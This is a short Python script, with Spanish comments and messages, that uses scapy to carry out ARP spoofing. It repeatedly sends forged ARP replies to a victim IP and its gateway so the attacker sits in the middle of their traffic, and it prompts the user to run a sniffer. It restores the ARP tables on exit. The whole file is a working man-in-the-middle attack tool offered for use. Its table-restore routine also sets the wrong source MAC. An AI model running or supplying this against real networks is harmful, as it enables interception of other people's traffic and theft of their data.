import sys
import os
import scapy.all as scapy
import time
def fallo(ip1,ip2):
    
        print ("La maquina victima no esta generando trafico\n")
        
        print ("Vuelve a ejecutar el programa")

def cmac(ip):
        arp_request = scapy.ARP(pdst = ip)

        difusion = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")

        arprequestdifusion = difusion / arp_request

        lista_de_respuestas = scapy.srp(arprequestdifusion, timeout = 5, verbose = False)[0]

        return lista_de_respuestas[0][1].hwsrc

def spoofeo(direccion_ip_obj, ip_spoofeada):

        paquete = scapy.ARP(pdst = direccion_ip_obj, hwdst = cmac(direccion_ip_obj), psrc = ip_spoofeada)

        scapy.send(paquete, verbose = False)
def restaurartablas(ip_destino, ip_origen):

        mac_destino = cmac(ip_destino)

        mac_origen = cmac(ip_origen)

        paquete = scapy.ARP(pdst = ip_destino, hwdst = mac_destino, psrc = ip_origen, hwsrc = mac_destino)

        scapy.send(paquete, verbose = False)

ip_objetivo = sys.argv[1]
gateway_ip = sys.argv[2]
print ("Ejecuta el programa de la siguiente manera poniendo como primer argumento la ip victima y como segundo la ip de la puerta de enlace o gateway de su red: sudo python3 arpspoofing.py 192.168.0.10 192.168.1.1")
if len(sys.argv[1]) < 10 or len(sys.argv[2]) < 10:
    print ("Ha introducido mal los parametros")
    
try:  
    paquetes_enviados = 0

    while True:

        spoofeo(ip_objetivo, gateway_ip)

        spoofeo(gateway_ip, ip_objetivo)

        paquetes_enviados = paquetes_enviados + 2

        print("\r[*]Se esta arpeando el objetivo... ahora use su sniffer la cantidad de paquetes enviados son:" +str(paquetes_enviados), end="")

        time.sleep(2)
          
                
            
except IndexError:
           fallo(ip_objetivo, gateway_ip)
except KeyboardInterrupt:
      print("\n Ha parado el programa.... Resteando tablas ARP del objetivo")
      restaurartablas(gateway_ip, ip_objetivo)
      restaurartablas(ip_objetivo, gateway_ip)
      print("Ha salido del programa")
